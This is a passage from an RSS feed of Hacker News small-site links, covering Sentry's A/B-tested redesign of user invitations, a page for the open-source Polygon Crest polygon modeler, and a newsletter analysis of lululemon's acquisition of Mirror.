<p>Alice: Oh awesome, we use Sentry. Can you add me to the organization?
Bob: Ah, I can’t invite you. Maybe ask Jen?</p>
</blockquote>
<p>In a perfect world, one of your administrators is tracked down, and they manually add the new teammate to the account. But sometimes that person is unknown, or is on a vacation, or maybe it takes them days or weeks or even months.</p>
<p>We began asking ourselves: what if we could unlock team members to fast-track this whole process and invite members themselves? This led to our next major change: updating our permission model to allow for <strong>members to request to invite other members.</strong></p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?fm=webp&amp;w=738 738w" sizes="(max-width: 738px) 100vw, 738px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=185 185w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=369 369w,
https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png?w=738 738w" sizes="(max-width: 738px) 100vw, 738px">
          <img alt="6-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/3OdTQxgXsLOT7x1LhbdkcW/a1da3024530fea1163d3d66de8b214bf/6-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a>  </p>
<p>Now, when non-administrators open up the Invite New Members modal, it changes contextually to become a “request to invite” rather than a direct invitation. Hitting “send” kicks off an email to all organization administrators, who are prompted to approve any outstanding requests.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4oi9gYhVX185djAJWppP3Q/ff565fcd34cf00c3a60a32c5ec0cde7b/7-invitations.png" alt="" title="7-invitations"></p><figcaption><p>Organization owners and managers can see pending invitation requests.</p></figcaption></figure><div>
<p>At this point, we had built what we thought was a fantastic new user experience and we just <em>doubled</em> the number of users who could take advantage of it. But this exercise of opening up user invitations got us thinking: what if there was an even <em>further</em> source of untapped users we weren’t reaching?</p>
<h2 id="removing-the-middleman-entirely"><a href="#removing-the-middleman-entirely" aria-label="removing the middleman entirely permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Removing the middleman entirely</h2>
<p>In the last section, we highlighted a scenario where one teammate asks another teammate for access to Sentry. And because of our recent changes, users can request to invite their teammates themselves instead of having to track down and ask their account administrator.</p>
<p>But this scenario still has a gatekeeping element: the new teammate has to ask <em>another</em> teammate for access. What if the new teammate spots an alert from Sentry in Slack stemming from their recent changes, and no one’s around to grant them access? Unfortunately, they’d land on an authentication wall that would prevent them from going any further.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?fm=webp&amp;w=449 449w" sizes="(max-width: 449px) 100vw, 449px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=112 112w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=225 225w,
https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png?w=449 449w" sizes="(max-width: 449px) 100vw, 449px">
          <img alt="8-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/51YEH5Ipq6HWcU052ogj6i/0967cecf4f1dd88efcbab507de6a8a69/8-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This begged the question: was there an untapped source of potential users we weren’t reaching by restricting invitations <em>only</em> to active Sentry users? What if new users didn’t have to ask anyone at all?</p>
<p>So, to keep this party going, we dug in and additionally made it possible for <strong>external users to request to join an organization</strong>.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/6mRCkcVZkkAlZ0ELzWUGHr/3123b1113330661bc7ee5023aa5ef54c/9-invitations.png" alt="" title="9-invitations"></p><figcaption><p>The “Request to Join” button has been added to the organization login page, allowing</p></figcaption></figure><div>
<p>Now when a user lands on an Organization’s login page, they have the option to “Request to join”, which asks for the user’s name and email address. Once they hit send, the organization owners are sent an email that prompts them to approve the join request. Just in case, there’s also a call-to-action to disable the feature entirely for their organization.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?fm=webp&amp;w=660 660w" sizes="(max-width: 660px) 100vw, 660px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=165 165w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=330 330w,
https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png?w=660 660w" sizes="(max-width: 660px) 100vw, 660px">
          <img alt="10-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/NwB91DxtuVJ7p8o5sPMmV/53d84e72fda2e78b4ccb31522ff4a02c/10-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Having developed a new contextual invitation modal and a pair of invite-friendly permission changes, we were <em>feeling</em> confident that these changes were going to have a strong impact on user behavior. It was time now to put our money where our code was, and verify that all this hard work actually moved the needle.</p>
<h2 id="ab-testing-the-impact"><a href="#ab-testing-the-impact" aria-label="ab testing the impact permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>A/B testing the impact</h2>
<p>Our standard procedure for validating the efficacy of product changes is through A/B testing (also known as split testing). This means instrumenting our application code to serve different experiences to segments of users over the same time period, and comparing the results. This step takes extra effort, but it’s worth it –&nbsp;the alternative is to settle for a before-and-after snapshot of data, which is too easily impacted by external factors like seasonality or marketing pushes.</p>
<p>ℹ️ <em>To learn more about how we perform A/B testing at Sentry, please see <a href="https://blog.sentry.io/2019/05/09/easy-ab-testing-with-planout">this earlier blog post</a>.</em></p>
<p>It’s easy to get carried away with A/B testing, and having so many permutations that you don’t have enough data to be statistically significant. So, to simplify things, we decided that all treatments would get the new modal experience, and our “treatment” groups would focus on the new permission changes.</p>
<p>This left us with 4 distinct treatments that we rolled out to 4 equally-sized customer segments:</p>
<ol>
<li><strong>Baseline</strong> (new modal only)</li>
<li><strong>Request to Invite</strong> (user invites another user)</li>
<li><strong>Request to Join</strong> (external user requests to join)</li>
<li><strong><em>Both</em></strong> Request to Invite and Request to Join are enabled together</li>
</ol>
<p>Our main criteria for determining success: which of these treatments would result in <strong>an increase in <em>accepted</em> invitations</strong> (and thus new users)?</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/rlobEVJ4FCzWbU1tmPqqb/8ed779f9a63aa3382e5590cfa8e4bec1/11-invitations_2_.png" alt="" title="11-invitations"></p><figcaption><p>% of accepted invitations relative to baseline</p></figcaption></figure><div>
<p>After 30 days, the results became clear (not to mention, statistically significant):</p>
<ul>
<li><strong>11%</strong> more users accepted invitations in the <em>Request to Invite</em> treatment vs. the baseline</li>
<li><strong>9%</strong> more users accepted invitations in the <em>Request to Join</em> treatment vs. the baseline</li>
<li><strong>21%</strong> more users accepted invitations who had both <em>Request to Invite</em> and <em>Request to Invite</em> treatments enabled</li>
</ul>
<p>It’s probably not a surprise that allowing a wider set of users to invite team members resulted in more users inviting team members. It’s also probably not a surprise that enabling both feature sets at the same time was even better (given that they complement each other)!</p>
<h2 id="turning-users-into-active-users"><a href="#turning-users-into-active-users" aria-label="turning users into active users permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Turning users into active users</h2>
<p>Having more users join your platform is great, but what’s the point if those users never actually <em>use</em> the product? To be truly confident …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</a></em></p>]]>
            </description>
            <link>https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations</link>
            <guid isPermaLink="false">hacker-news-small-sites-23841049</guid>
            <pubDate>Wed, 15 Jul 2020 03:42:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polygon Crest – open-source 3D polygonal editor]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23839480">thread link</a>) | @app4soft
<br/>
July 14, 2020 | http://ysflight.in.coocan.jp/polygoncrest/e.html | <a href="https://web.archive.org/web/*/http://ysflight.in.coocan.jp/polygoncrest/e.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div bordercolor="#111111" width="100%" id="AutoNumber1">
        <tbody><tr>
          <td>
          
          <h2>
            What's Polygon Crest?</h2>
          <p>
            This program is a polygon editor. Maybe more commonly called a 
			polygon modeler. You can call whichever comfortable for you. The 
			main purpose is to build aircraft and ground visual models for YS 
			FLIGHT SIMULATOR, but you can use it for making general polygonal 
			models. If you make a correct solid model, you can export the data 
			for 3D printing, for example. I wanted to make it easy to create 
			aircraft models, so this program can quickly make a popular 
			airfoils, and extrude along the wing leading and trailing edges. It 
			also has basic boolean operations and rounding functions as well.
            </p>
		  <p>
            <a href="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english.png">
			<img height="170" src="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english_small.png" width="320" xthumbnail-orig-image="scrnshot/cessna172-english.png"></a></p>
		  <h2>
            How to use?</h2>
		  <p>
            Usage can be found in the following URLs.</p>
		  <p>
            <a href="http://polycre.help.en.ysflight.com/">
			<strong>http://polycre.help.en.ysflight.com/</strong></a> (English)</p>
		  <p>
            <a href="http://polycre.help.jp.ysflight.com/">
			<strong>http://polycre.help.jp.ysflight.com/</strong></a> (Japanese)</p>
		  <h2>
            Donations are welcome</h2>
		  <p>
            Polygon Crest is a fre and open-source program.&nbsp; Therefore, you can 
			use it for free of charge.&nbsp; However, I appreciate if you donate some 
			money for supporting the development.&nbsp; For making donation, please 
			send some money via PayPal using the following button.
            </p>
		  
<!--webbot bot="HTMLMarkup" endspan i-checksum="11026" -->
		  <p>
            I will use the donated money for upgrading my developing 
			environment, buying books for learning new programming techniques, 
			maintaining and adding contents in YSFLIGHT.COM.&nbsp; Thank you for your 
			support!
            </p>
		  <h2>
            Download</h2>
		  <p>
            <strong>Version 20150329</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest/3000-6677_4-76169623.html">[For MacOSX 
			&amp; Linux]</a> (Linux binary is also included in the Mac OSX 
			package.)</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest-for-Windows/3000-6677_4-76170331.html">[For Windows]</a></strong></p>
		  <h2>
            Updates</h2>
          <p>
          <strong>2016/02/21</strong></p>
		  <ul>
			  <li>Digitally signed Mac OSX binary.&nbsp; You should be able to 
			  run the program without warning.&nbsp; If your setting only allows 
			  App Store applications, you will need to change the security 
			  setting to allow App Store &amp; digitally signed by known developers 
			  (or something like that.)</li>
			  <li>Linux binary is bundled in the Mac OSX package.&nbsp; You can 
			  run LinuxInstaller.py in the zip file, which will create an icon 
			  on the desktop.&nbsp; If it works well, I'm going to do the same 
			  for YSFLIGHT.</li>
			  <li>Now YSFLIGHT shares the same data structure of dynamic model 
			  (.DNM) with PolygonCrest.&nbsp; From the next version on, if you 
			  can open the .DNM file with PolygonCrest, it should (is supposed 
			  to) appear the same in YSFLIGHT.</li>
			  <li>Imprinting:&nbsp; You can imprinting a polygon or a constraint 
			  edge to a nearby polygons by selecting a polygon and then select 
			  Edit-&gt;Projection-&gt;Imprinting.</li>
			  <li>Sewing:&nbsp; You can select two vertices and select 
			  Edit-&gt;Local Operations-&gt;Sew between two vertices.&nbsp; Vertices 
			  will be created between the selected vertices and polygons along 
			  the path will be split.</li>
		  </ul>
		  <p>
          <strong>2015/05/23</strong></p>
		  <ul>
			  <li>Polygon Crest for Linux: You can really use the system 
			  clipboard.&nbsp; (Now it's closed inside Polygon Crest program)</li>
			  <li>Input/Output of Wavefront .OBJ format files.</li>
			  <li>Add "Recently Used Files"</li>
			  <li>Color Palette dialog.</li>
			  <li>Polygon Crest for Windows: Erased a false error message on 
			  start up.&nbsp; (It only appeared when I build in a release 
			  configuration, and I didn't notice :-P)</li>
		  </ul>
		  <p>
          <strong>2014/07/19</strong></p>
		  <p>
          First release!&nbsp; Version 20140716.&nbsp; I wanted to add more 
		  features.&nbsp; But, if I wait until I finish all the features that I 
		  want to add, it's going to take infinity.&nbsp; I decided to make it 
		  open now.&nbsp; I'll keep developing and newer versions will be 
		  available.</p>
          
          </td>
        </tr>
        </tbody></div></div>]]>
            </description>
            <link>http://ysflight.in.coocan.jp/polygoncrest/e.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839480</guid>
            <pubDate>Tue, 14 Jul 2020 23:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Breaking Down Lululemon's $500M Mirror Acquisition]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23838564">thread link</a>) | @Cpevans
<br/>
July 14, 2020 | https://insider.fitt.co/issue-no-87-why-mirror-sold/ | <a href="https://web.archive.org/web/*/https://insider.fitt.co/issue-no-87-why-mirror-sold/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-content">
			<div>
				<div>
					<section>
						<p>A few weeks back, lululemon acquired Mirror for $500M. When the news broke, we wrote&nbsp;<a href="https://insider.fitt.co/lululemon-acquires-mirror-500m/" target="_blank" rel="noopener">a quick analysis</a>&nbsp;of how the partnership might play out. Today, we’re going deeper to explore lulu’s ambitions, Mirror’s motivation for selling, and how, in hindsight, Nike, Peloton, and COVID-19 sealed the deal.</p>
<p><strong>TL;DR:</strong>&nbsp;Even if this acquisition doesn’t pan out, everybody wins. Here’s why.</p>
					</section>

          <section>
						      <div>
        <div>
                      <h2>Calculated Risk</h2>
          
          <p>M&amp;A is a mixed bag. In the case of activewear retailers, buying into digital fitness via high-profile purchases has&nbsp;<a href="https://twitter.com/JoeVennare/status/1281301589190488064" target="_blank" rel="noopener">proven futile</a>. So why did lululemon, a fast-growing apparel company, roll the dice on Mirror? One word: Nike.</p>
<p>Nike is the king of activewear. Try as they might, foes like adidas, Reebok, and Under Armour are no match for the swoosh. For its part, lululemon hopes to become a worthy adversary — if for no other reason than to remain in the good graces of Wall Street. On both accounts, Mirror factors heavily into the equation.</p>
<p>Putting this competition into context, lululemon trails Nike by an order of magnitude. Nike has a $152B market cap. Over the last 12 months, they’ve done $37B in sales. Meanwhile, lulu’s market cap is $37B, and the company had revenues of $3.85B over the same period.</p>
<p>While shares of the yoga pant maker have outperformed Nike in recent years, lulu might not ever reach the scale of Nike. But beating Nike outright isn’t the point. Ultimately, lululemon is in competition with itself, where Nike represents the upper bounds of what’s possible.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Just Keep Growing</h2>
          
          <p>To prove that they haven’t peaked, lululemon has one mandate: just keep growing.</p>
<p>Moving beyond the yoga niche and expanding its total addressable market, the company’s&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=96471d02c6" target="_blank" rel="noopener">five-year strategic plan</a>, released in April 2019, charted the path forward: “double men’s, double digital, and quadruple international” revenues. Add self-care products, a foray into footwear, and the opening of a 20,000-square-foot experiential store (complete with yoga studios and a restaurant) into the mix and grow they shall.</p>
<p>A few months later, in November of 2019, lululemon invested $1M into Mirror’s $34M Series B-1, a bargain for a foothold in connected fitness. As part of the investment, and in keeping with its goal of becoming an experiential brand, lululemon ambassadors began creating workout content for the Mirror platform.</p>
<p>Flash-forward to March: when COVID hit, the table was set. With retail stores shuttered and fitness studios closed, shopping and sweating moved online. In a few short weeks, lululemon had seen enough; they were ready to go all-in on Mirror.</p>
<ul>
<li>In the first week of store closures, 170K people joined lulu’s live workouts on Instagram.</li>
<li>Pre-COVID, 64% of lululemon guests used a digital workout option at home.</li>
<li>During the pandemic, as the coronavirus spread, that number jumped to 75%.</li>
<li>86% of lulu customers who used an at-home option during the outbreak plan to continue or increase their new digital workout habit.</li>
</ul>
<p>In April, lulu’s online sales surged&nbsp;<a href="https://www.cnbc.com/2020/06/11/lululemon-lulu-reports-fiscal-q1-2020-earnings.html" target="_blank" rel="noopener">125%</a>, a trend that’s expected to continue. Add in the fact that some 50% of Mirror users are also lululemon customers, and this deal checks a lot of boxes for the growth-focused retailer.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Why Mirror Sold</h2>
          
          <p>Last year, Mirror CEO Brynn Putnam told Fast Company she was building “the next iPhone.” Far from another connected fitness upstart, Mirror would be “the third screen in your life that you’re going to turn to for all immersive interactive experiences going forward.”</p>
<p>About seven months later, Putnam pulled the ripcord, selling her company amid a global pandemic — circumstances tailor-made for an immersive third screen.</p>
<p>So why did Mirror sell? lulu made an offer they couldn’t refuse. Putnam, a solo, female founder just secured a “W” for herself, her investors, and New York’s startup scene.</p>
<p>Beyond the obvious, it’s fair to ask,&nbsp;<em>why now?</em>&nbsp;In many ways, Peloton forced Putnam’s hand.</p>
<p>Pitching Mirror as the “next iPhone” was a strategic move that 1.) established a big vision worthy of $70M+ in funding, and 2.) helped the company duck the question, “how do you compete with Peloton?” Their answer was simple — we don’t.</p>
<p>When COVID hit, Mirror was pigeonholed. They weren’t the third screen, they were in direct competition with Peloton. And despite surging sales, Mirror’s growth pales in comparison to Peloton’s. Plus, there’s&nbsp;<a href="https://www.linkedin.com/posts/joevennare_fitness-startups-activity-6679025786697117697-YuI5" target="_blank" rel="noopener">a growing list of Mirror-like competitors</a>&nbsp;hitting the market. All of a sudden, an interactive screen didn’t feel all that innovative, or defensible.</p>
<p>Meanwhile, digital fitness companies are raking in funding. Hydrow, Aaptiv, and NEOU recently closed investments as Tonal and Tempo target new funds. If Mirror considered raising on the back of its COVID boost, they’d have to become a customer acquisition and retention machine, where every move is audited in relation to Peloton’s now public (and soaring) metrics.</p>
<p>In the end, joining forces with lululemon was more compelling than slugging it out with Peloton or adhering to the “third screen” narrative.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Lulu x Mirror</h2>
          
          <p>Upon announcing the deal, lululemon’s stock jumped, and onlookers have been quick to heap on the praise.</p>
<p>According to Bank of America analysts, Mirror could generate&nbsp;<a href="https://www.marketwatch.com/amp/story/lululemon-acquisition-mirror-could-generate-700-million-and-reach-600000-subscribers-by-2023-bank-of-america-2020-07-01" target="_blank" rel="noopener">$700M</a>&nbsp;in revenue and reach 600,000 subscribers by 2023.</p>
<p>To realize this lofty forecast, lululemon will sell Mirrors to its existing customer base, starting with its 489 corporate-owned stores across the globe. The retailer will continue creating content for the platform, where Mirror instructors will be clad in lululemon gear. More than simply selling more apparel, Mirror’s ability to generate recurring revenue and strengthen lulu’s relationship with consumers is the chief aim of this acquisition.</p>
<p>While the hard work of transforming an athleisure retailer into a tech company is just beginning, it will be difficult to criticize lululemon for shooting this shot. Whether or not they can keep growing will be the question on everyone’s mind:</p>
<p><em>“Lulu is showing no signs of slowing down, but acquisitions made outside a retailer’s core skill set have rarely been seamless. There is nothing bad about the story right now. The scariest thing [for investors] about Lulu is, is this as good as it gets?”</em>&nbsp;– Simeon Siegel, managing director &amp; senior retail analyst at BMO Capital Markets.</p>
<hr>
        </div>
      </div>

            <div>
        <div>
                      <h2>💻 Closing the Gap </h2>
          
          <p>Teletherapy is gaining traction during the pandemic. It just might be the key to unlocking access for millions of individuals battling mental illness.</p>
<p>There’s a&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">shocking gap</a>&nbsp;between demand (those in need of care) and supply (access to affordable care).</p>
<ul>
<li>46M Americans report experiencing mental illness each year, while only 42.6% received treatment.</li>
<li>Individuals who are able to access care will wait an average of&nbsp;<a href="https://www.psychiatryadvisor.com/home/practice-management/long-wait-times-typical-for-psychiatry-appointments/" target="_blank" rel="noopener">25 days</a>&nbsp;for an appointment.</li>
<li>With in-room therapy costing $150–$400 per session, plus the added cost of medication,&nbsp;<a href="https://www.kff.org/medicaid/report/mental-health-financing-in-the-united-states/" target="_blank" rel="noopener">45%</a>&nbsp;of untreated individuals cite cost as a barrier.</li>
</ul>
<p><strong>Pros:</strong>&nbsp;During COVID, the majority of therapists switched from in-person to remote therapy. A recent&nbsp;<a href="https://www.apaservices.org/practice/legal/technology/psychologists-embrace-telehealth" target="_blank" rel="noopener">survey</a>&nbsp;found that three quarters of clinicians are exclusively using teletherapy. The fact that teletherapy has been&nbsp;<a href="https://pubmed.ncbi.nlm.nih.gov/26864655/" target="_blank" rel="noopener">shown to be</a>&nbsp;just as effective as in-person therapy for treating PTSD, depression, and anxiety helped solidify the switch.</p>
<p><strong>Cons:</strong>&nbsp;The convenience and flexibility of remote care have proven beneficial, but concerns related to privacy regulations, insurance coverage, Zoom fatigue, and missing non-verbal cues leave a lot of room for improving the experience.</p>
<p>As consumer demand for digital behavioral health grows, investors are seizing the moment.</p>
<ul>
<li>According to&nbsp;<em>Rock Health</em>, in the first half of 2020, digital behavioral health companies received&nbsp;<a href="https://rockhealth.com/reports/2020-midyear-digital-health-market-update-unprecedented-funding-in-an-unprecedented-time/" target="_blank" rel="noopener">$588M</a>&nbsp;in funding — a number equal to the annual funding for this category in any previous year.</li>
</ul>
